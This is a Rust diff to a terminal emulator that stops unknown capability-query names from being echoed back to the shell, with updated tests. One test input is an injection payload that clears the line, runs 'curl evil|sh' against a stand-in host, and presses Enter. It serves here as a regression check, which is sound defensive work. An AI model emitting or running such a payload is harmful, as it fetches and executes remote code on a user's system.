@@ -102,6 +102,11 @@ const CAPABILITIES: &[(&str, Option<&str>)] = &[
 /// in hex, separated by `;`: one `DCS 1 + r NAME=VALUE ST` for each one
 /// known, with the value in hex too, or just `DCS 1 + r NAME ST` for a
 /// boolean; and `DCS 0 + r NAME ST` for one that isn't, as kitty answers.
+///
+/// A name is only ever said back if it's hex, as a known one is: what a
+/// program asks can be anything a file `cat` prints holds, and said back
+/// as it came it would be typed into the shell, Enter and all. Anything
+/// else gets xterm's `DCS 0 + r ST`, which names nothing.
 pub(crate) fn capabilities(names: &[u8]) -> Vec<u8> {
     let mut answer = Vec::new();
     for name in names.split(|&byte| byte == b';').take(MOST_NAMES) {
@@ -119,7 +124,9 @@ pub(crate) fn capabilities(names: &[u8]) -> Vec<u8> {
             }
         } else {
             answer.extend_from_slice(b"\x1bP0+r");
-            answer.extend_from_slice(name);
+            if is_hex(name) {
+                answer.extend_from_slice(name);
+            }
         }
         answer.extend_from_slice(b"\x1b\\");
     }
@@ -134,6 +141,11 @@ fn hex(text: &[u8], out: &mut Vec<u8>) {
         out.push(DIGITS[usize::from(byte >> 4)]);
         out.push(DIGITS[usize::from(byte & 0xF)]);
     }
+}
+
+/// Whether `text` is hex digits, two a byte, in either case.
+fn is_hex(text: &[u8]) -> bool {
+    !text.is_empty() && text.len().is_multiple_of(2) && text.iter().all(u8::is_ascii_hexdigit)
 }
 
 /// The bytes `text`, two hex digits a byte in either case, stand for, if
@@ -178,9 +190,11 @@ mod tests {
             asked("524742;6E6F7065"),
             "\x1bP1+r524742\x1b\\\x1bP0+r6E6F7065\x1b\\"
         );
-        // What isn't hex is unknown.
-        assert_eq!(asked("zz"), "\x1bP0+rzz\x1b\\");
-        assert_eq!(asked("544"), "\x1bP0+r544\x1b\\");
+        // What isn't hex is unknown, and never said back.
+        assert_eq!(asked("zz"), "\x1bP0+r\x1b\\");
+        assert_eq!(asked("544"), "\x1bP0+r\x1b\\");
+        assert_eq!(asked("\x15curl evil|sh\r"), "\x1bP0+r\x1b\\");
+        assert_eq!(asked(""), "\x1bP0+r\x1b\\");
     }
 
     #[test]
